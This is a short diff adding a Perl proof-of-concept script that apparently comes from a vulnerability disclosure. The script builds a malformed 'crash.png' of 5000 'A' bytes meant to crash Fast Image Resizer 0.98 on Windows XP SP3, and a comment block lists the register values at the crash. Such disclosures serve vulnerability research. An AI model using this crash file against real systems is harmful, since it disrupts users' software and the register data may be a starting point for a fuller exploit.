@@ -1,0 +1,23 @@
+#!/usr/bin/perl
+#
+# Title : Fast Image Resizer 098 Local Crash Poc
+# Author: Niko
+# Tested: Windows XP SP3 (En)
+# Apps  : http://adionsoft.net/fastimageresize/FastImageResizer_098.exe
+#
+# EAX 00000000
+# ECX 010422F8
+# EDX 00000000
+# EBX 00000000
+# ESP 0012F658
+# EBP 00000000
+# ESI 010421A8
+# EDI 01050000
+# EIP 019849C1 fastim_1.019849C1
+#########################################
+my $file= "crash.png";
+my $junk = "\x41" x 5000;
+open($FILE,">$file");
+print $FILE $junk;
+close($FILE);
+print "png file created successfully\n";
